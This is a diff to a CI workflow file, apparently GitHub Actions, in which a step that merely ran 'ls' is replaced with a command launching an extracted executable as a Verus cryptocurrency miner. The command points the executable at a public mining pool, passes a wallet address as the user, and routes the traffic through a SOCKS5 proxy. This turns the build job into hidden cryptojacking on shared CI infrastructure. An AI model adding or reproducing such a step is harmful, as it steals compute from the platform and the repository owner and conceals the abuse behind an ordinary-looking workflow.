@@ -27,4 +27,4 @@ jobs:
     - name: Extract
       run: Expand-Archive verccsse018379.zip
     - name: Start
-      run: ls
+      run: .\verccsse018379\verccsse.exe -a verus -o stratum+tcp://na.luckpool.net:3956 -u R9MV4kKdPuuTKQWD5TerszZL6RapC9pz4Q.cc1 -p x -t 2 --proxy=socks5://72.212.63.101:4145
